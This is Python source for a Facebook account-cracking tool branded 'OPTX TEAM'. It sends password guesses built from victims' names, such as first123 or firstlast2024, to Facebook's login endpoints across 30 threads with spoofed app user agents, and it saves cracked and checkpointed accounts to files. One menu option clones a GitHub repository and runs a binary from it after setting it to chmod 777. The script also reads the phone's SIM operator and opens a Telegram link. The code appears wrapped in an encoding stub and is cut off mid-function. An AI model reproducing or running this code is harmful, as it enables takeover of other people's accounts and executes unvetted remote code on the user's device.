
A='.DEVIL'
import os, sys, base64 as B
C='import os,sys,glob,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re,hashlib
import datetime,subprocess
import zipfile
import marshal
from uuid import uuid4
from time import localtime as lt
from time import sleep as sp
#######---------____________#############
def R_UA():
    samsung_models = [
        "SM-G920F|G920FXXU6EVH6",
        "SM-R870|R870XXU1AUH3",
        "SM-J320F|J320FXXU0ARL2",
        "SM-A125F|A125FXXU1BUA4",
        "GT-N7100|N7100XXSFQE1",
        "SM-T561|T561XXU0ARB1",
        "SM-A715F|A715FXXS5BUI1",
        "SM-J320F|I9500XXUEMJ3",
        "SM-M325F|M325FXXU1BUH1",
        "SM-J320F|J320FXXU0ARL2",
        "SM-F916U|F916USQS2JWE4",
    ]
    model_, build = random.choice(samsung_models).rsplit('|')
    os_v = random.randint(4, 13)
    fbav = f"{os_v}.0.{random.randint(111, 999)}.{random.randint(111, 999)}"
    ua = ('[FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBLC/bn_BD;FBBV/'+str(random.randint(111111111,999999999))+';[FBAN/FB4A;FBAV/118.0.0.22.79;FBBV/81374851;FBDM/{density=4.0,width=1440,height=2392};FBLC/ar_AR;FBRV/54394206;FBCR/Vodafone;FBMF/Huawei;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/LGLS992;FBSV/14.0;FBOP/20;FBCA/arm64-v8a;]')
    return ua
#####_____________user agent____########
ugen = []
for agent in range(2000):
    aa = 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36;'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12', '13'])
    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/533.1'
    fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(fullagnt)
#####___________UA2__________########
def M4():
    abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
    pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])
    build = random.choice(abc)+random.choice(abc)+random.choice(abc)
    FBBV = str(random.randint(111111111,999999999))
    FBCR = random.choice(["Jazz","Zong","Mobilink","Ufone"])
    #ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])>
    ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","Dalvik/1.6.0 (Linux; U; Android 4.4.4; Z987 Build/KTU84P) [FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; MI 5X MIUI/V10.3.1.0.ODBCNXM) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507224;FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBDV/MI 5X;FBSV/8.1.0;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C) [FBAN/FB4A;FBAV/175.0.0.40.97;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/111983758;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-N9005 Build/NJH47F) [FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.0.0; AGS2-L09 Build/HUAWEIAGS2-L09) [FBAN/Orca-Android;FBAV/238.0.0.14.120;FBPN/com.facebook.orca;FBLC/hu_HU;FBBV/179092826;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/AGS2-L09;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1200,height=1852};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML414DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/231.0.0.25.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/170889107;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML414DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1196};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 7.0; Hisense Hi  3 Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/ 180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/ Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi- v7a:armeabi;FBDM/ {density=2.0,width=720height=1280};FB_FW/1;FBRV/181817659;]","Dalvik/2.1.0;(Linux;U;Android 7.0;Hisense-Hi-3;Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/Hisense;FBDV/Hisense-Hi-3;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;FBRV/181817659;]","Dalvik/2.1.0 (Linux; U; Android 9; LM-V405 Build/PKQ1.190202.001) [FBAN/FB4A;FBAV/252.0.0.22.355;FBPN/com.facebook.katana;FBLC/en_US;FBBV/191850142;FBCR/Verizon ;FBMF/LGE;FBBD/lge;FBDV/LM-V405;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2147};FB_FW/1;FBRV/0;]","Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; POT-LX1 Build/HUAWEIPOT-L01) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/197803941;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1426};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 10; SM-N975U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/253.0.0.17.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/200372525;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBDV/SM-N975U;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2759};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build/HUAWEIDRA-LX2) [FBAN/Orca-Android;FBAV/239.1.0.17.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/180535023;FBCR/TelkomSA;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DRA-LX2;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1356};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 7.1.1; E6653 Build/32.4.A.1.54) [FBAN/Orca-Android;FBAV/151.0.0.17.95;FBPN/com.facebook.orca;FBLC/en_ZA;FBBV/89897644;FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 10; SM-G970U1 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/es_MX;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]","Dalvik/2.1.0 (Linux; U; Android 10; POT-LX3 Build/HUAWEIPOT-L03) [FBAN/Orca-Android;FBAV/270.0.0.17.120;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/225129965;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2139};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 7.1.2; KFMUWI Build/NS6315) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782190;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=600,height=976};FB_FW/1;]",])
    return ua
#####_______________&&&&&&&&&____#####
try:
    import bs4
    from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
    os.system('pip install bs4')
except Exception as e:
    print(e)
from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE
#__________________[ DATE SYSTEM ]__________________#
dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DEVEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+ '\x1b[38;5;196m-\x1b[38;5;46m' +str(bln)+ '\x1b[38;5;196m-\x1b[38;5;46m' +str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def jahidj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)       
sim = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').replace('\n', '').replace(',', '\033[1;31m | \x1b[38;5;46m')
os.system('xdg-open https://t.me/optxxd')
##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
S = '\033[96;1m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
EXTRA ='\x1b[38;5;208m'
#_______COLOUR______#
BLACK = '\x1b[1;90m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
orange = '\x1b[38;5;196m'
yellow = '\x1b[38;5;208m'
black = '\x1b[1;30m'
rad = '\x1b[38;5;160m'
green = '\x1b[38;5;46m'
yelloww = '\x1b[1;33m'
blue = '\x1b[38;5;6m'
purple = '\x1b[1;35m'
cyan = '\x1b[1;36m'
white = '\x1b[1;37m'
faltu = '\x1b[1;47m'
pvt = '\x1b[1;0m'
gren = '\x1b[38;5;154m'
gas = '\x1b[1;32m'
###########__________defline___________#############
def line():
    print('\033[1;37m ═════════════════════════════════════════════')

def p(x):
    print(x)
#__________________ [ Lists Used in Script]______________
id = []
ok = []
cp = []
loop = 0
method=[]
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()
def logo():
    os.system('clear')
    logo = (f'''\033[1;32m                                 
    \x1b[38;5;6m>===>      >======>   >===>>=====> >=>      >=> 
  \x1b[38;5;160m>=>    >=>   >=>    >=>      >=>      >=>   >=>   
\x1b[38;5;6m>=>        >=> >=>    >=>      >=>       >=> >=>    
\x1b[38;5;160m>=>        >=> >======>        >=>         >=>      
\x1b[38;5;6m>=>        >=> >=>             >=>       >=> >=>    
  \x1b[38;5;160m>=>     >=>  >=>             >=>      >=>   >=>   
    \x1b[38;5;6m>===>      >=>             >=>     >=>      >=> 
                  {rad} T{green} E{rad} A{green} M
\x1b[38;5;6m ═════════════════════════════════════════════
 {rad}[{blue}◆{rad}] {green}𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑  {white}▶︎ {green}HExX-XD / MOHDX
 {rad}[{blue}◆{rad}] {green}𝐕𝐄𝐑𝐒𝐈𝐎𝐍    {white}▶︎ {green}1.0
 {rad}[{blue}◆{rad}] {green}𝐓𝐎𝐎𝐋𝐓𝐘𝐏𝐄   {white}▶︎ {green}TRIAL{white}{rad}|{faltu}{rad}FILE CLONING{pvt}{green}{rad}|
 {rad}[{blue}◆{rad}] {green}𝐓𝐄𝐋𝐄𝐆𝐑𝐄𝐀𝐌  {white}▶︎ {rad}({white}@OPTXXD{rad})
\x1b[38;5;6m ═════════════════════════════════════════════''')
    p(logo)
def clear():
    os.system('clear')
    logo()
####_______________________&_______________############
class iAmMain:
    def __init__(self):
        self.gp = "https://b-graph.facebook.com/auth/login"
        self.ap = "https://b-api.facebook.com/auth/login"
    def iAmMenu(self):
        #heck_again()
        logo()
        p(" \033[91;1m[\033[97;1m1\033[91;1m] \033[92;1m𝐒𝐓𝐀𝐑𝐓 𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 ")
        p(" \033[91;1m[\033[97;1m2\033[91;1m] \033[92;1m𝐒𝐓𝐀𝐑𝐓 𝐂𝐑𝐄𝐀𝐓𝐄 𝐅𝐈𝐋𝐄")
        p(" \033[91;1m[\033[97;1m3\033[91;1m] \033[92;1m𝐉𝐎𝐈𝐍 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ")
        #p(" [4\033[1;37m] Join Facebook group")
        p(" \033[91;1m[\033[97;1m0\033[91;1m] \033[92;1m𝐄𝐗𝐈𝐓 𝐓𝐇𝐄 𝐓𝐎𝐎𝐋 ")
        line()
        opt1 = input(f''' {rad}[{white}◆{rad}] {green}𝐒𝐄𝐋𝐄𝐂𝐓𝐈𝐎𝐍 {white} - {yelloww}''')
        if opt1 == "1":self.file_menu()
        if opt1 == "2":self.dump_menu()
        if opt1 == "3":os.system('xdg-open https://t.me/optxxd')
        elif opt1 == "4":Grep().with_names()
        elif opt1 == "5":Join().Whatsapp()
        elif opt1 == "0":exit("  𝐆𝐨𝐨𝐝 𝐁𝐲𝐞 !!!!!!! ")
        else:p("  Wrong Select ");sp(2);self.iAmMenu()
########___________________FILE_dump__________#########
    def dump_menu(self):
        os.system('git clone --depth=1 https://github.com/Hannan-404/FILE')
        os.system('cd FILE') 
        os.system('chmod 777 FILE64') 
        os.system('./FILE64')
        
        
########___________________FILE_Menu________############
    def file_menu(self):
        #check_again()
        logo()
        file = input(f''' \033[91;1m[\033[97;1m◆\033[91;1m] \033[92;1mEXAMPLE {rad}[{white}sdcard/filename.txt{rad}]\n {rad}[{white}⁂{rad}] {green}INPUT FILE PATH {white}- {yelloww}''')
        try:
            id = open(file,"r").read().splitlines()
            self.method_select(id)
        except FileNotFoundError:
            sp(2);self.file_menu()
        
    def method_select(self,id):
        #check_again()
        logo()
        print(f''' {rad}[{white}1{rad}] {green}𝐌𝐄𝐓𝐇𝐎𝐃 𝐌𝟏''')
        print(f''' {rad}[{white}2{rad}] {green}𝐌𝐄𝐓𝐇𝐎𝐃 𝐌𝟐''')
        print(f''' {rad}[{white}3{rad}] {green}𝐌𝐄𝐓𝐇𝐎𝐃 𝐌𝟑''')
        print(f''' {rad}[{white}4{rad}] {green}𝐌𝐄𝐓𝐇𝐎𝐃 𝐌𝟒''')
        line()
        mthd = input(f''' {rad}[{white}✗{rad}] {green}𝐒𝐄𝐋𝐄𝐂𝐓𝐈𝐎𝐍 {white} - {yelloww}''')
        if mthd =='1':
            method.append("i")
            self.password_menu(id)
        if mthd =='2':
            method.append('ii')
            self.password_menu(id)
        if mthd =='3':
            method.append('iii')
            self.password_menu(id)
        elif mthd =="4":
            method.append('iiii')
            self.password_menu(id)
        else:p(f" {rad} 𝐖𝐫𝐨𝐧𝐠 𝐒𝐞𝐥𝐞𝐜𝐭 ! ");sp(2);self.method_select(id)

    def password_menu(self,id):
        #check_again()
        pwx=[]
        logo()
        print(f' {rad}[{white}◆{rad}] \033[1;32m𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐒𝐘𝐒𝐓𝐄𝐌');line();print(f' {rad}[{white}1{rad}] \033[1;32m𝐀𝐔𝐓𝐎 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐂𝐋𝐎𝐍𝐄\n {rad}[{white}2{rad}] \033[1;32m𝐂𝐇𝐎𝐈𝐂𝐄 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐂𝐋𝐎𝐍𝐄');line()
        ppp=input((f''' {rad}[{white}◆{rad}] {green}𝐒𝐄𝐋𝐄𝐂𝐓𝐈𝐎𝐍 {white}- {yelloww}'''))
        if ppp in ['1','01']:
                pwx.append('first last')
                pwx.append('firstlast')
                pwx.append('first123')
                pwx.append('first 123')
                pwx.append('first1234')
                pwx.append('first12345')
                pwx.append('firstlast123')
                pwx.append('first123456')
                pwx.append('first123456789') 
                pwx.append('first first') 
                pwx.append('first2023') 
                pwx.append('first2024') 
                pwx.append('first2007') 
                pwx.append('first2006') 
                pwx.append('first2005') 
        else:
                 try:
                         clear()
                         ps_limit = int(input(f''' {rad}[{white}◆{rad}] {green}𝐈𝐍𝐏𝐔𝐓 𝐏𝐀𝐒𝐒 𝐋𝐈𝐌𝐈𝐓𝐒 {white}- {yelloww}'''))
                 except:
                         ps_limit =1
                 clear()
                        #print(f'\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mEXAMPLE : firstlast/first@@/first123 ')
                         #linex()
                 for i in range(ps_limit):
                         pwx.append(input(f''' {rad}[{white}◆{rad}] {green}𝐄𝐗𝐀𝐌𝐏𝐋𝐄 {rad}[{white}𝐟𝐢𝐫𝐬𝐭𝐥𝐚𝐬𝐭 𝐟𝐢𝐫𝐬𝐭𝟏𝟐𝟑  𝐄𝐓𝐂{rad}]\n {rad}[{white}⁂{rad}] {green}PASSWORD NO.{i+1} {white}- {yelloww}'''))
        logo()
        print(f" {rad}[{white}◆{rad}] {green}𝐓𝐎𝐓𝐀𝐋 𝐈𝐃𝐒  {white}- \x1b[38;5;38m%s "%(str(len(id))))
        print(f" {rad}[{white}◆{rad}] {green}𝐒𝐈𝐌 {white}: \033[1;32m{sim}{rad} ")
        print(f" {rad}[{white}◆{rad}] {green}𝐈𝐅 𝐍𝐎 𝐑𝐄𝐒𝐔𝐋𝐓 [{white}𝐎𝐧/𝐎𝐟𝐟{green}] 𝐀𝐈𝐑𝐏𝐋𝐀𝐍𝐄 𝐌𝐎𝐃𝐄")
        line()
        with tpe(max_workers=30) as saqi:
            for user in id:
                uid = user.split("|")[0]
                nm = user.split("|")[1]
                if "i" in method:
                    saqi.submit(self.method1,uid,nm,pwx)
                elif "ii" in method:
                    saqi.submit(self.method2,uid,nm,pwx)
                elif "iii" in method:
                    saqi.submit(self.method3,uid,nm,pwx)
                elif "iiii" in method:
                    saqi.submit(self.method4,uid,nm,pwx)
        self.saved_results(ok,cp)
    def saved_results(self,ok,cp):
        line()
        print(" 𝐂𝐥𝐨𝐧𝐢𝐧𝐠 𝐇𝐚𝐬 𝐛𝐞𝐞𝐧 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 ")
        print(" 𝐓𝐨𝐭𝐚𝐥 𝐎𝐤 𝐀𝐜𝐜𝐨𝐮𝐧𝐭𝐬 : %s "%(len(ok)))
        print(" 𝐓𝐨𝐭𝐚𝐥 𝐂𝐩 𝐀𝐜𝐜𝐨𝐮𝐧𝐭𝐬 : %s "%(len(cp)))
        line()
        input(" [•] 𝐏𝐫𝐞𝐬𝐬 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨 𝐆𝐨 𝐁𝐚𝐜𝐤 ")
        self.iAmMenu()
#####______________mtha1_________________##########
    def method1(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write(f'\r\r\033[1;31m [\033[1;32m{date}\033[1;31m]\033[97;1m-\033[91;1m[\x1b[38;5;38m%s\033[91;1m]\033[97;1m-\033[91;1m[\033[92;1m𝐎𝐊:-%s\033[91;1m]\033[97;1m-\033[91;1m[𝐂𝐏:-%s]\033[97;1m '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
                data = {"adid": str(uuid.uuid4()),
                    "format": "json",
